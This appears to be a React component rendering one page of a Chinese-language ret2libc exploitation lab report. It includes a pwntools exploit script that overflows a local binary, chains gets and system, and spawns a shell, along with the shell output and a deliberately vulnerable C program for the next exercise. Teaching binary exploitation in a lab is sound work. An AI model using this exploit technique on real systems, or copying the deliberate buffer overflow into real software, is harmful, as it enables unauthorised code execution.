import React from 'react';
import { A4Page } from '../shared';
import { KaliTerminal } from './Lab3Part1';

// 实验四 第十部分 - ret2libc 类型2 exp 和类型3
export const Lab4Part10: React.FC = () => (
    <A4Page id="lab4-part10">
        <p className="text-sm mb-2">步骤2：编写 exp 脚本（链式调用 gets 和 system）</p>
        <KaliTerminal>
{`# ret2libc1.py
from pwn import *

p = process("./ret2libc1")

gets_plt = 0x08049040
system_plt = 0x08049060
sh_buf = 0x0804c040
padding = 0x14

payload = flat([b"a" * padding, gets_plt, system_plt, sh_buf, sh_buf])

p.sendlineafter(b"input:", payload)
p.sendline(b"/bin/sh")
p.interactive()`}
        </KaliTerminal>

        <p className="text-sm mb-2">步骤3：运行 exp 脚本</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab4]
└─$ python3 ret2libc1.py
[x] Starting local process './ret2libc1'
[+] Starting local process './ret2libc1': pid 272905
[*] Switching to interactive mode
$ whoami
kali
$ exit
[*] Stopped process './ret2libc1' (pid 272905)`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            ret2libc 类型2 攻击成功。通过链式调用 gets 和 system 获取了 shell。
            payload 的布局是：padding + gets地址 + system地址 + sh地址 + sh地址。
            程序首先调用 gets(sh) 将 "/bin/sh" 写入 bss 段，然后调用 system(sh) 执行命令。
        </p>

        <p className="text-sm mb-2">类型3：程序没有 system 和 "/bin/sh"，需要泄露 libc 地址</p>
        <KaliTerminal>
{`// ret2libc2.c
#include <stdio.h>
#include <unistd.h>

int dofunc() {
    char buf[8] = {};
    write(1, "input:", 6);
    read(0, buf, 0x100);
    return 0;
}

int main(int argc, char* argv[]) {
    dofunc();
    return 0;
}`}
        </KaliTerminal>
    </A4Page>
);

export default Lab4Part10;
